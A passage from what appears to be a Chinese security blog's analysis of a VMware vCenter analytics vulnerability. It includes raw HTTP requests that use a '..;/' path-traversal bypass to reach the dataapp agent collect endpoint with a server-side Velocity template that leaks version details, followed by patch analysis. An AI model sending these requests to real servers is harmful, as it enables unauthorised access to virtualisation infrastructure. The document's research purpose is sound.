<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">secret</span>
<span class="na">X-Plugin-Type</span><span class="o">:</span> <span class="l">test</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">354</span>
<span class="na">{"manifestSpec"</span><span class="o">:</span> <span class="l">{"resourceId": "b1", "dataType": "b2", "objectId": "b3", "versionDataType": "b4", "versionObjectId": "b5"}, "objectType": "a1", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a2", "localPayloadPath": "a3", "localObfuscationMapPath": "a4"}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122425-96d98aba-491c-1.png"/><br/>
collectAgent<br/>
获取信息</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&amp;_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2065</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">secret</span>
<span class="na">X-Plugin-Type</span><span class="o">:</span> <span class="l">BafwKlMbWp</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">{"manifestContent"</span><span class="o">:</span> <span class="l">"&lt;manifest recommendedPageSize=\"500\"&gt;\n   &lt;request&gt;\n      &lt;query name=\"vir:VCenter\"&gt;\n         &lt;constraint&gt;\n            &lt;targetType&gt;ServiceInstance&lt;/targetType&gt;\n         &lt;/constraint&gt;\n         &lt;propertySpec&gt;\n            &lt;propertyNames&gt;content.about.instanceUuid&lt;/propertyNames&gt;\n            &lt;propertyNames&gt;content.about.osType&lt;/propertyNames&gt;\n            &lt;propertyNames&gt;content.about.build&lt;/propertyNames&gt;\n            &lt;propertyNames&gt;content.about.version&lt;/propertyNames&gt;\n         &lt;/propertySpec&gt;\n      &lt;/query&gt;\n   &lt;/request&gt;\n   &lt;cdfMapping&gt;\n      &lt;indepedentResultsMapping&gt;\n         &lt;resultSetMappings&gt;\n            &lt;entry&gt;\n               &lt;key&gt;vir:VCenter&lt;/key&gt;\n               &lt;value&gt;\n                  &lt;value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\"&gt;\n                     &lt;resourceItemToJsonLdMapping&gt;\n                        &lt;forType&gt;ServiceInstance&lt;/forType&gt;\n                     &lt;mappingCode&gt;&lt;![CDATA[\n                        #set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())\n                        #set($objectId = \"vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid\")\n                        #set($obj = $LOCAL-cdf20Result.newObject(\"vim.ServiceInstance\", $objectId))\n                        $obj.addProperty(\"MSG\", \"exist\")\n                        $obj.addProperty(\"OSTYPE\", $content-about-osType)\n                        $obj.addProperty(\"BUILD\", $content-about-build)\n                        $obj.addProperty(\"VERSION\", $content-about-version)]]&gt;\n                     &lt;/mappingCode&gt;\n                     &lt;/resourceItemToJsonLdMapping&gt;\n                  &lt;/value&gt;\n               &lt;/value&gt;\n            &lt;/entry&gt;\n         &lt;/resultSetMappings&gt;\n      &lt;/indepedentResultsMapping&gt;\n   &lt;/cdfMapping&gt;\n   &lt;requestSchedules&gt;\n      &lt;schedule interval=\"1h\"&gt;\n         &lt;queries&gt;\n            &lt;query&gt;vir:VCenter&lt;/query&gt;\n         &lt;/queries&gt;\n      &lt;/schedule&gt;\n   &lt;/requestSchedules&gt;\n&lt;/manifest&gt;", "contextData": "a2", "objectId": "a3"}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122426-9728781e-491c-1.png"/><br/>
最后编写利用，效果如下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122426-977f2204-491c-1.png"/></p>
<h2 data-content="1" id="8376841073c9ef68aab7b369e9187923">补丁分析</h2>
<p>DataAppAgentController的每个方法里其实都会调用DataAppAgentId，之前的补丁分析这个类有做一个id过滤，而这里其实没做其他改动，只是多一个IncorrectFormat异常捕捉。所以之前的DataAppAgentId补丁和processTelemetry是没有关系的。<br/>
而存在漏洞的collect接口被直接删除掉了。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122427-97f1fd42-491c-1.png"/></p>
</div>
</div>